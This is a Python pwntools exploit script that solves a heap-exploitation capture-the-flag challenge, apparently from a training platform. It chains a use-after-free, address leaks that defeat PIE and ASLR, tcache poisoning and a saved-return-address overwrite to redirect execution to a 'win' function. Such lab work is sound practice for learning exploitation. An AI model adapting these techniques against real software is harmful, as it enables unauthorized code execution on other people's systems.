#!/usr/bin/env python

from pwn import *

get_flag = True
chall_name = '11.0'

context.arch = "amd64"

def run_with_gdb(p):
    gdb.attach(p,'''
    set follow-fork-mode parent
    b *main
    b *echo''') # b *+121
    run_exploit(p, False)
    # 8xg

def run_commands_list(commands, p, print_command):
    for command in commands:
        if print_command and not get_flag:
            print('COMMAND: ', command)
            input("")
        print_send_print(command, p)

def print_send_print(line_to_send, p):
    try:
        p.sendline(line_to_send)
        if get_flag:
            print(p.recvrepeat(1).decode())
        else:
            print(p.recvrepeat(0.2).decode())
    except:
        print('Exception in \'print_send_print\'')
        pass

def get_address_leak_from_output(output):
    #print(output)
    start_search_string = b'Data: '
    leak_start = output.find(start_search_string) + len(start_search_string)
    leak_ends = output.find(b'\n', leak_start)
    leaked_bytes = output[leak_start:leak_ends]
    return adjust_bytes_leaked_address(leaked_bytes)
    #return int(output[secret_start:secret_ends], 16)

def adjust_bytes_leaked_address(byte_address):
    bytearray_address = bytearray(byte_address)
    bytearray_address.reverse()
    address = int(bytearray_address.hex(), 16)
    return address

def run_exploit(p, debug):
    if debug:
        run_with_gdb(p)

    """
    With a (should i know the name of the vulnerability?) we're going 
    to keep the pointer for a chunk that 'echo' function will get
    from tcache and use to allocate data. That way we can make
    the 'echo' function echo data from itself: the address of a
    string in the binary that we use to bypass pie and a address of
    a string that's in the stack to bypass ASLR.
    With the addresses, we're going to use the scanf function to
    corrupt the tcache table and make a chunk point to the stack.
    In the stack we're going to overwrite main ret address with
    the win function address.
    """

    print('Now i\'m going to leak some addresses to bypass PIE and ASLR.')
    input('Ready for stage 1?')
    welcome_message = p.recvrepeat(1).decode()
    print(welcome_message)
    commands = [
            b'malloc 0 32', # 32 its the size that echo uses when malloc
            b'free 0' # put the chunk in tcache and keeping the pointer
        ]
    run_commands_list(commands, p, False)

    ##### STAGE 1 - LEAKING ADDRESSES AND BYPASSING PIE AND ASLR #######
    # leaking address of string in the binary to bypass PIE
    #input("")
    p.sendline('echo 0 0')
    #input("")
    bin_echo_leak = get_address_leak_from_output(p.recvrepeat(1))
    #input("")
    # setting base address and bypassing PIE
    elf = ELF('/challenge/' + chall_name)
    bin_echo_address = next(elf.search(b'/bin/echo'))
    elf.address = bin_echo_leak - bin_echo_address
    win_address = p64(elf.sym['win'])

    # leaking stack address to bypass ASLR
    #input("")
    p.sendline('echo 0 8') # Now the 'Data: ' string that's on the stack
    #input("")
    stack_leak = get_address_leak_from_output(p.recvrepeat(1))
    #input("")
    # ret of main in the stack 0x7fff966a40c8 - stack leak 0x7fff966a3f52 = 0x176 of distance
    ret_of_main = stack_leak + 0x176

    print('/bin/echo address: ', hex(bin_echo_leak))
    print('Win address:', hex(elf.sym['win']))
    print('Stack leak: ', hex(stack_leak))
    print('Main saved ret address:', hex(ret_of_main))
    print('Stage 1 Finished.')

    ##### STAGE 2 - PWNING TO MAIN ######
    input('Ready for stage 2?')

    # We overwrite the saved return address of main (previously pointing to _libc_blabla)
    # with the address of WIN.
    # When main finish, will ret to win and print the flag
    commands = [
                b'malloc 0 100',
                b'malloc 1 100',
                b'free 1',
                b'free 0',
                # corrupting the chunk '1' with the stack ret pointer by scanfing to the chunk '0' after he was freed
                b'scanf 0 ' + p64(ret_of_main) + b'ZZZZZZZZ' + b'BBBBBBBB',
                b'malloc 0 100', 
                b'malloc 0 100',
                # overwriting the ret of main with win_address
                b'scanf 0 ' + win_address,
                b'quit'
                ]

    run_commands_list(commands, p, False)
    p.close()
    print('Stage 2 finished.')

if get_flag:
    ssh_connection = ssh(host='.college',user='hacker')
    process_full_path = '/challenge/' + chall_name
    p = ssh_connection.run(process_full_path)
    run_exploit(p, False)
    ssh_connection.close()
else:
    p = process('./' + chall_name)
    run_exploit(p, False)
